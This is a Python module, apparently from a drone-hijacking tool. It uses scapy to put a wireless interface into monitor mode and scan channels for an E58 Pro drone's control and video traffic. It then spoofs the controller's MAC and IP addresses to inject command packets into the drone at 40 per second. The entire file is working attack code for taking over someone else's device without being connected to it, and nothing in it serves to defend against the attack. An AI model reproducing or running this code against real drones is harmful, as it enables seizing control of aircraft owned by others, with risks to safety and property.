from time import sleep
from collections import Callable
from typing import Optional

from scapy.arch import get_if_addr
from scapy.config import conf
from scapy.layers.dot11 import RadioTap, Dot11FCS, Dot11QoS, Dot11, Dot11Deauth, Dot11Disas, Dot11Beacon, Dot11Elt
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import LLC, SNAP
from scapy.packet import Packet
from scapy.sendrecv import sendp, send, sniff

from e58pro.command_payloads import new_video_ack, E58ProBasePayload, E58VideoACKExtension
from e58pro.transmitter_process import TransmitterProcessController, CommandRequest

from e58pro.connection_addresses import ConnectionAddresses

from scanners.channel_scanner import scan_channels
from scanners.interface_controller import InterfaceController


DRONE_COMMAND_RECEIVE_PORT = 8800
DRONE_VIDEO_SEND_PORT = 1234

WILDCARD_IP = "0.0.0.0"

#COMPLEX_SCANNER_BPF_FILTER = "(wlan type mgt) or udp"
COMPLEX_SCANNER_BPF_FILTER = "udp"

SSID_ELEMENT_ID = 0

UDP_SRC_PORT = 49092  # TODO: Will be need to be set to the port the video is being sent to.
UDP_DST_PORT = 8800

DEFAULT_INTERFACE = "wlx4401bb9182b7"

COMMANDS_PER_SECOND = 40

EndpointRoutine = Callable[[TransmitterProcessController], None]


def _udp_layer_3_4(drone_ip: str, controller_ip: str) -> UDP:
    return IP(src=controller_ip, dst=drone_ip) / \
           UDP(sport=UDP_SRC_PORT, dport=UDP_DST_PORT)


def _dot11_layer_2(drone_mac: str, controller_mac: str) -> SNAP():
    # QoS Data
    return RadioTap(present="Rate+TXFlags") / \
           Dot11FCS(addr1=drone_mac, addr2=controller_mac, addr3=drone_mac, type=2, subtype=8) / \
           Dot11QoS() / \
           LLC(ssap=0xAA, dsap=0xAA) / \
           SNAP()


# TODO: Also start thread that watches for video ACK numbers and responds to keep the video feed flowing.

def connectionless_interception_routine(interface_name: str,
                                        addrs: ConnectionAddresses,
                                        endpoint_routine: EndpointRoutine):
    """Intercepts an existing connection with a drone, then runs the endpoint routine 'payload' once interception is complete.
    endpoint_routine accepts the name of the interface to use, a UDP packet to build packets with, and
    a function (either of scapy's send or sendp) to use to send."""
    sender_func = sendp

    controller_l4_base = _dot11_layer_2(addrs.drone_mac, addrs.controller_mac) / \
                         _udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)
    try:
        with TransmitterProcessController(interface_name, COMMANDS_PER_SECOND, controller_l4_base, sender_func) as proc:
            endpoint_routine(proc)
    except KeyboardInterrupt:
        pass


def connected_interception_routine(interface_name: str,
                                   drone_ip: str,
                                   controller_ip: str,
                                   endpoint_routine: EndpointRoutine) -> None:
    """Used when you're actually connected to the drone's network."""
    layers_3_4 = _udp_layer_3_4(drone_ip, controller_ip)
    try:
        with TransmitterProcessController(interface_name, COMMANDS_PER_SECOND, layers_3_4, send) as proc:
            endpoint_routine(proc)
    except KeyboardInterrupt:
        pass


def drone_packet_verifier(packet: Packet) -> Optional[ConnectionAddresses]:
    """Returns a pair of ((drone_mac, drone_ip), (controller_mac, controller_ip)) if verified, else None."""
    if UDP in packet:
        src_tup = (packet[Dot11].addr2, packet[IP].src)
        dst_tup = (packet[Dot11].addr1, packet[IP].dst)
        if packet[UDP].dport == DRONE_COMMAND_RECEIVE_PORT:
            return ConnectionAddresses(*dst_tup, *src_tup)
        elif packet[UDP].sport == DRONE_VIDEO_SEND_PORT:
            return ConnectionAddresses(*src_tup, *dst_tup)
    return None


def scan_for_drone(interface_name: str, secs_per_channel: float = 0.3) -> tuple[int, ConnectionAddresses]:
    """Scans over all supported channels attempting to find the drone.
    Blocks until the drone is found, at which point a tuple of
    (channel, drone_mac_ip_tup, controller_mac_ip_tup) is returned."""
    while True:
        match_generator = scan_channels(interface_name, secs_per_channel)
        for chan, p in match_generator:
            if addrs := drone_packet_verifier(p):
                return chan, addrs


def _find_info_val_for(element_id: int, beacon: Dot11Beacon) -> Optional[bytes]:
    layer = beacon
    while layer:
        if isinstance(layer, Dot11Elt) and layer.ID == element_id:
            return layer.info
        layer = layer.payload
    return None


# TODO: INTEGRATE!
def scan_for_drone_traffic(interface_name: str,
                           secs_per_channel: float,
                           ssid_prefix: bytes,
                           command_receive_port: int,
                           video_send_port: int
                           ) -> tuple[int, Optional[Dot11Beacon], Optional[UDP], Optional[UDP]]:
    """Scans each channel to find traffic that's indicative of a drone.
    Returns a tuple of (channel, found_beacon?, found_command?, found_video?) if any of traffic was found.
    For the SSID, only the prefix is checked. The entire string doesn't need to match."""
    while True:
        last_channel = None
        beacon = None
        command = None
        video = None
        for chan, packet in scan_channels(interface_name, secs_per_channel,):  # COMPLEX_SCANNER_BPF_FILTER):
            if last_channel != chan:
                if video or command or beacon:
                    return last_channel, beacon, command, video
                else:
                    beacon = None
                    command = None
                    video = None
                    last_channel = chan

            if Dot11Beacon in packet:
                ssid = _find_info_val_for(SSID_ELEMENT_ID, packet)
                if ssid and ssid.startswith(ssid_prefix):
                    beacon = packet
            elif UDP in packet:
                if packet[UDP].dport == command_receive_port:
                    command = packet
                elif packet[UDP].sport == video_send_port:
                    video = packet


def _scan_for_current_video_ack(interface_name: str, timeout: Optional[float] = None) -> Optional[int]:
    found = sniff(iface=interface_name,
                  count=1,
                  filter="udp",
                  lfilter=lambda p: E58VideoACKExtension in p,
                  timeout=timeout)
    if found:
        return found[0][E58VideoACKExtension].ack_number
    else:
        return None


def connectionless_main(interface_name: str, secs_per_channel: float, endpoint_routine: EndpointRoutine) -> None:
    inter_controller = InterfaceController(interface_name)
    inter_controller.set_monitor_mode(True)

    print("Scanning for drone...")
    channel, addrs = scan_for_drone(interface_name, secs_per_channel)
    print(f"Found: {addrs}")
    inter_controller.set_channel(channel)  # Should already be on the correct channel, but we'll set it for correctness.

    connectionless_interception_routine(interface_name, addrs, endpoint_routine)
    print("Exiting")


def connected_main(interface_name: str, endpoint_routine: EndpointRoutine) -> None:
    # Accept BSSID and handle connection?
    try:
        our_ip = get_if_addr(interface_name)
        drone_ip = conf.route.route(WILDCARD_IP)[2]
        if drone_ip == WILDCARD_IP:
            raise RuntimeError("Unable to get default gateway. Are you connected?")
    except OSError as e:
        raise OSError(f"Cannot find device {interface_name}") from e

    connected_interception_routine(interface_name, drone_ip, our_ip, endpoint_routine)


def test_routine():
    chan, addrs = scan_for_drone(DEFAULT_INTERFACE, 2)
    controller_l4_base = _dot11_layer_2(addrs.drone_mac, addrs.controller_mac) / \
                         _udp_layer_3_4(addrs.drone_ip, addrs.controller_ip)
    return TransmitterProcessController(DEFAULT_INTERFACE, 40, controller_l4_base, sendp)
